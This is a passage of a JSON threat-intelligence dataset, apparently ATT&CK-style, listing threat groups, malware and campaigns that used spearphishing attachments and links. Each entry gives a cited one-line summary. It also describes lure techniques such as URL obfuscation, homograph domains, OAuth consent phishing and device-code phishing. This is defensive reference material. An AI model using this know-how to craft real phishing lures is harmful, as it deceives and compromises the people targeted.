                        "Name": "Bisonal",
                        "Description": "<name> has been delivered as malicious email attachments.[45]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has sent spearphishing emails with a malicious RTF document or Excel spreadsheet.[46][47]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.[48][49]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has been delivered by phishing emails containing malicious Microsoft Office documents.[50]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> used spearphishing emails with malicious Microsoft Word attachments to infect victims.[51][52]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has gained execution through luring users into opening malicious attachments.[53][54][55][56]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "During <name>, Transparent Tribe sent malicious attachments via email to student targets in India.[57]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "For <name>, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.[58]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has been delivered by sending victims a phishing email containing a malicious .docx file.[59]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> has been delivered to victim's machines through malicious e-mail attachments.[60]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.[61][62][63][64][65][66][67][68]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has crafted and sent victims malicious attachments to gain initial access.[69]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> has been distributed within a malicious Excel attachment via spearphishing emails.[70]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> can be distributed through emails with malicious attachments from a spoofed email address.[71]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has sent spearphishing emails with malicious RAR and .LNK attachments.[72][73]"
                    },
                    "G0079": {
                        "ID": "G0079",
                        "Name": "DarkHydrus",
                        "Description": "<name> has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the \"attachedTemplate\" technique to load a template from a remote server.[1][74][75]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has been distributed via spearphishing emails containing archive attachments, with file types such as .iso, .zip, .img, .dmg, and .tar, as well as through malicious documents.[76]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has been delivered via spearphishing emails that contain a malicious zip file.[77]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has sent emails with malicious attachments to gain initial access.[78]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.[79][80]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has sent spearphishing emails containing malicious attachments in the form of PDFs, Word documents, JavaScript files, and Control Panel File (CPL) executables.[81]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been delivered by phishing emails containing attachments. [82][83][84][85][86][87][88][89][90]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> has been distributed via spearphishing as an email attachment.[91]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> conducted an e-mail thread-hijacking campaign with malicious ISO attachments.[92][53]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.[93]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.[94][95]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has targeted victims with e-mails containing malicious attachments.[96]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.[97][98][99][100][101]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has distributed targeted emails containing Word documents with embedded malicious macros.[102][103][104]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> has been distributed via spearphishing as an email attachment.[49]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.[105]"
                    },
                    "G0084": {
                        "ID": "G0084",
                        "Name": "Gallmaker",
                        "Description": "<name> sent emails with malicious Microsoft Office documents attached.[106]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has delivered spearphishing emails with malicious attachments to targets.[107][108][109][110][111][112]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> sent emails to victims with malicious Microsoft Office documents attached.[113]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has been delivered via phishing emails with malicious attachments.[114]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> has sent spearphishing emails containing malicious attachments.[115][116]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has been delivered via phishing e-mails with malicious attachments.[117]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.[118][119][120][121]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> sent spearphishing emails containing malicious password-protected RAR attachments.[122][123]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has been delivered as malicious e-mail attachments.[42]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> has been delivered by phishing emails containing malicious Microsoft Excel attachments.[100]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> has been distributed through malicious e-mail attachments.[32]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.[124][125][126][127][128][8][129][130]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has been distributed via spearphishing emails with malicious attachments.[131]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has been delivered via spearphishing campaigns through a malicious Word document.[132]"
                    },
                    "S1075": {
                        "ID": "S1075",
                        "Name": "KOPILUWAK",
                        "Description": "<name> has been delivered to victims as a malicious email attachment.[133]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has targeted victims with spearphishing emails containing malicious Microsoft Word documents.[134][135][136][137]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used spam emails weaponized with archive or document files as its initial infection vector.[131]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.[138][139]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> is delivered via a malicious XLS attachment contained within a spearhpishing email.[140]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has delivered spearphishing emails that contain a zipped file with malicious contents.[141][142][143]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has sent spearphishing emails containing malicious .zip files.[144]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.[145][146][147][148]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has been delivered to victims via emails with malicious HTML attachments.[149][150]"
                    },
                    "G0103": {
                        "ID": "G0103",
                        "Name": "Mofang",
                        "Description": "<name> delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.[151]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has sent phishing emails with malicious Microsoft Word and PDF attachments.[152][153][154]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.[155][156][157][158][159][160] [161][162]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used spearphishing attachments to deliver initial access payloads.[163][164][165]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has used malicious e-mail attachments to deliver malware.[166]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has been spread via e-mail campaigns utilizing malicious attachments.[167][168]"
                    },
                    "G0133": {
                        "ID": "G0133",
                        "Name": "Nomadic Octopus",
                        "Description": "<name> has targeted victims with spearphishing emails containing malicious attachments.[169][170]"
                    },
                    "S0346": {
                        "ID": "S0346",
                        "Name": "OceanSalt",
                        "Description": "<name> has been delivered via spearphishing emails with Microsoft Office attachments.[171]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has been delivered via spearsphishing emails.[170]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.[172][173][174]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers.[175][176]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.[177]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "During <name>, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.[178]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has been distributed as a malicious attachment within a spearphishing email.[81]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has used spearphishing with an attachment to deliver files with exploits to initial victims.[179][180][181][182]"
                    },
                    "G0068": {
                        "ID": "G0068",
                        "Name": "PLATINUM",
                        "Description": "<name> has sent spearphishing emails with attachments to victims as its primary initial access vector.[183]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> was distributed via malicious Word documents.[184]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has been delivered via spearphishing attachments.[185]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has spread through emails with malicious attachments.[186][187][188][189][190][191][192][193][194]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has been distributed through spearphishing emails with malicious attachments.[195]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has attached a malicious document to an email to gain initial access.[196]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has been distributed via malicious e-mail attachments including MS Word Documents.[197][198][199][200][201]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has been distributed in e-mails with malicious Excel or Word documents.[202]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.[203]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has been delivered via spearphishing attachments disguised as PDF documents.[204]"
                    },
                    "G0048": {
                        "ID": "G0048",
                        "Name": "RTM",
                        "Description": "<name> has used spearphishing attachments to distribute its malware.[205]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has been distributed as malicious attachments within spearphishing emails.[206][81]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has delivered malicious Microsoft Office attachments via spearphishing emails.[207][208][209][210]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has sent spearphishing emails with malicious hta file attachments.[211]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has sent e-mails with malicious attachments often crafted for specific targets.[212]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. [213][214][215]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> has been delivered to victims through malicious e-mail attachments.[216]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been distributed via malicious Microsoft Office documents within spam emails.[217]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents.[218]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has sent phishing emails with malicious attachments for initial access including MS Word documents.[219][220]"
                    },
                    "G0062": {
                        "ID": "G0062",
                        "Name": "TA459",
                        "Description": "<name> has targeted victims using spearphishing emails with malicious Microsoft Word attachments.[221]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used spearphishing emails with malicious attachments to initially compromise victims.[222][223][224][225][226][227][228][229][230]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has sent spearphishing attachments with password protected ZIP files.[231][232][233]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> has been delivered through spearphishing emails.[234]"
                    },
                    "G0089": {
                        "ID": "G0089",
                        "Name": "The White Company",
                        "Description": "<name> has sent phishing emails with malicious Microsoft Word attachments to victims.[235]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used e-mail to deliver malicious attachments to victims.[60]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> has been distributed via a malicious Word document within a spearphishing email.[135]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has delivered payloads via spearphishing attachments.[236]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has sent spearphishing e-mails with attachments to deliver malicious payloads.[237][238][239][240][241]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has used an email with an Excel sheet containing a malicious macro to deploy the malware[242]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.[243][244][245][246][247]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has been delivered via spearphishing e-mails with password protected ZIP files.[231]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has been distributed as a malicious attachment within an email.[248][69]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has sent spearphishing emails with attachment to harvest credentials and deliver malware.[249]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has sent emails to intended victims with malicious MS Word and Excel attachments.[250]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.[251][252][253]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> has been delivered via malicious Word documents and archive files.[254]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> has been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment.[46]"
                    }
                }
            },
            "002": {
                "name": "Spearphishing Link",
                "href": "/techniques/T1566/002",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").[1] URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example, hxxp://google.com@1157586937.[2]Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens.[3] These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. [4]Adversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \"consent phishing\" into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .[3][4]Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \"device code phishing,\" an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.[5][6][7]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can send \"consent phishing\" emails containing malicious links designed to steal users\u2019 access tokens.[8]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has been distributed via spearphishing link.[9]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has sent spearphishing emails containing hyperlinks to malicious files.[10]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.[11][12][13][14]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.[15][16][17]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has sent spearphishing emails containing malicious links.[18]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has sent spearphishing emails containing malicious links.[19][20][21][22][23]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has sent spearphishing emails containing links to .hta files.[24][25]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> leveraged spearphishing emails with malicious links to initially compromise victims.[26][27]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has been spread via emails with embedded malicious links.[28][29][30]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used spearphishing e-mails with links to cloud services to deliver malware.[31]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has been spread through e-mail campaigns with malicious links.[32][33]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "During <name>, Transparent Tribe sent emails containing a malicious link to student targets in India.[34]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.[35][36]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent emails with URLs pointing to malicious documents.[37][38]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has sent malicious links to victims through email campaigns.[39]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> is distributed in phishing emails containing links to distribute malicious VBS or MSI files.[40] <name> uses applications such as Microsoft Teams for distributing links to payloads.[40]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has sent spearphishing emails to potential targets that contained a malicious link.[41]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.[42][43]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has sent spearphishing emails containing malicious links.[44]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been delivered by phishing emails containing links. [45][46][47][48][49][50][51][51][52]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has sent spearphishing emails containing a link to a zip file hosted on Google Drive.[53]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has relied on victims to open malicious links in e-mails for execution.[54]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has used spearphishing emails (often sent from compromised accounts) containing malicious links.[55][56]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has conducted broad phishing campaigns using malicious links.[57]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has distributed targeted emails containing links to malicious documents with embedded macros.[58]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has been spread via malicious links embedded in e-mails.[59][60]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> has been spread in phishing campaigns using malicious web links.[61]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has been delivered via phishing emails which contained malicious links.[62]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has been delivered via malicious links embedded in e-mails.[63]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> has been distributed via e-mails containing a malicious link.[23]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.[64][65][66]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has been distributed as a malicious link within an email.[67]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has sent malicious links to victims via email.[68]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used spam emails that contain a link that redirects the victim to download a malicious document.[67]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.[69][70]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has sent spearphishing emails containing a malicious Dropbox download link.[71]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has sent phishing emails that contain a link to an external server with ZIP and RAR archives.[72][73]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.[74][75][76][77]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> has been spread through malicious links embedded in e-mails.[63]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> has been spread via malicious links embedded in emails.[78]"
                    },
                    "G0103": {
                        "ID": "G0103",
                        "Name": "Mofang",
                        "Description": "<name> delivered spearphishing emails with malicious links included.[79]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has sent phishing emails with malicious links included.[80]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has sent targeted spearphishing e-mails with malicious links.[81][82][83]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has delivered malicious links to their intended targets.[84]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has sent victims emails containing links to compromised websites.[85]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has been spread via e-mail campaigns utilizing malicious links.[61]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.[86]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has sent spearphising emails with malicious links to potential victims.[87]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email.[88][89]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors sent spearphishing emails containing a malicious link.[90]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "During <name>, the threat actors sent phishing emails to victims that contained a malicious link.[91]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has been distributed through malicious links contained within spearphishing emails.[44]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has used spearphishing with links to deliver files with exploits to initial victims.[92][93][94]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has been delivered via spearphishing emails which contained malicious links.[95]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has spread through emails with malicious links.[96][97][98][99][100][101][102]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has been distributed through malicious links contained within spearphishing emails.[44]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has crafted phishing emails containing malicious hyperlinks.[103]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has sent e-mails with malicious links often crafted for specific targets.[104][105]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> has been delivered to victims through e-mail links to malicious files.[106]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "<name> has been spread via emails containing malicious links.[85]"
                    },
                    "S0646": {
                        "ID": "S0646",
                        "Name": "SpicyOmelette",
                        "Description": "<name> has been distributed via emails containing a malicious link that appears to be a PDF document.[38]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been distributed through phishing emails containing a malicious URL.[107]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used spearphishing e-mails with malicious links to deliver malware.  [108][106]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
